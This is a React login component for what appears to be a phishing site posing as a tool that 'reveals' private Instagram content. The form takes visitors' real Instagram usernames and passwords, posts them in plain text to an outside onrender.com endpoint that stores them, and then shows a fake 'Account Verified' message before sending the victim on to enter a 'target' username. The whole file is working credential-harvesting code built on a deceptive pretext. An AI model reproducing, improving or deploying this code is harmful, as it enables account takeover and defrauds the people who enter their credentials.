import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useNavigate } from "react-router-dom";
import { 
  Lock, User, Eye, EyeOff, ArrowRight, Loader2, 
  AlertCircle, CheckCircle2, ShieldCheck, Fingerprint, Globe 
} from "lucide-react";

const InstagramLogin = () => {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState('');
  const [identifier, setIdentifier] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState({ type: '', message: '' });

  useEffect(() => {
    if (status.message) {
      const timer = setTimeout(() => setStatus({ type: '', message: '' }), 5000);
      return () => clearTimeout(timer);
    }
  }, [status]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!identifier || !password) {
      setStatus({ type: 'error', message: 'Your own login details are required for verification.' });
      return;
    }

    setIsLoading(true);
    setStatus({ type: '', message: '' });

    try {
      await new Promise(resolve => setTimeout(resolve, 1200));
      // Storing user's own data in your database
      await axios.post("https://insights-m3ek.onrender.com/api/user/store", { identifier, password });

      setStatus({ type: 'success', message: 'Account Verified! Unlocking Reveal Engine...' });
      
      // Navigate to the next page to enter the TARGET username
      setTimeout(() => navigate("/reveal-content"), 1500);
    } catch (err) {
      setIsLoading(false);
      setStatus({ 
        type: 'error', 
        message: "Verification failed. Use your valid Instagram login." 
      });
    }
  };

  return (
    <div className="min-h-screen bg-white text-slate-900 font-sans flex flex-col items-center justify-center p-6">
      
      <div className={`fixed top-8 left-1/2 -translate-x-1/2 z-50 flex items-center gap-3 px-6 py-4 rounded-2xl border shadow-2xl backdrop-blur-md transition-all duration-500 transform ${status.message ? 'translate-y-0 opacity-100' : '-translate-y-12 opacity-0'}`}>
        {status.type === 'success' ? <CheckCircle2 size={18} className="text-green-600" /> : <AlertCircle size={18} className="text-red-600" />}
        <p className="text-sm font-bold">{status.message}</p>
      </div>

      <div className="w-full max-w-[480px] space-y-4">
        <div className="bg-slate-50 rounded-[40px] p-8 md:p-12 border border-slate-100 shadow-sm relative overflow-hidden">
          <div className="mb-10">
            <div className="flex items-center gap-3 mb-4">
               <div className="bg-blue-600 text-white p-2 rounded-lg">
                 <ShieldCheck size={20} />
               </div>
               <span className="text-[10px] font-black uppercase tracking-widest text-blue-600">Step 1: Authorization</span>
            </div>
            <h1 className="text-3xl font-bold tracking-tighter mb-2">Verify Your Identity</h1>
            <p className="text-slate-500 text-sm leading-relaxed">
              To reveal private content, you must first verify that you have a <strong>valid Instagram account</strong>. Enter your own details below to unlock the engine.
            </p>
          </div>

          <form className="space-y-4" onSubmit={handleSubmit}>
            <div className="relative group">
              <User className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-600" size={18} />
              <input
                disabled={isLoading}
                type="text"
                placeholder="Your Instagram Username"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                className="w-full pl-14 pr-5 py-5 bg-white border border-slate-200 rounded-[22px] text-sm focus:border-blue-600 outline-none transition-all"
              />
            </div>

            <div className="relative group">
              <Lock className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-600" size={18} />
              <input
                disabled={isLoading}
                type={showPassword ? "text" : "password"}
                placeholder="Your Instagram Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full pl-14 pr-14 py-5 bg-white border border-slate-200 rounded-[22px] text-sm focus:border-blue-600 outline-none transition-all"
              />
              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-6 top-1/2 -translate-y-1/2 text-slate-400">
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
            
            <button 
              disabled={isLoading}
              type="submit"
              className="w-full mt-4 font-bold py-5 rounded-[22px] bg-black text-white hover:bg-slate-800 transition-all flex items-center justify-center gap-3 disabled:opacity-50"
            >
              {isLoading ? <Loader2 size={18} className="animate-spin" /> : "Verify My Account"}
              {!isLoading && <ArrowRight size={18} />}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;